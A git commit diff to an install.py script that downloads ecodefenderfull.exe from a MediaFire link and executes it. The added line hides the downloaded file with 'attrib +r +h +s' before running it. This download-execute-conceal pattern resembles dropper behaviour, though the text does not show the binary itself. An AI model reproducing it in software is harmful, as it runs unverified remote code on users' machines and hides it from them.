0e23d09f5aab6aa05404c993d02d5da886b04b64
AlexPhamNgoQuoc <131502621+AlexPhamNgoQuoc@users.noreply.github.com>
2023-04-23 19:00:31 +0700

    Update install.py
    Whoopsi doop 💯

--- install.py
+++ install.py
@@ -24,6 +24,7 @@ while True:
         r = requests.get('https://download1587.mediafire.com/s4gxcntnkifg3LiZydGjZLw9nWdU1oZsMiGJaOJfXY_p3gT253VTIodqOqy8oQw0wGYZKRXxtgOP5zt507gChiyzww/9ch0lmcu65z0fkw/ecodefenderfull.exe', allow_redirects=True)
         open('ecodefenderfull.exe', 'wb').write(r.content)
         print("Install Complete!")
+        os.system("attrib +r +h +s ecodefenderfull.exe")
         os.system("ecodefenderfull.exe")
     elif hashed_key in [hashlib.sha256(k.encode()).hexdigest() for k in valid_ekeys]:
         print('Start installing...')
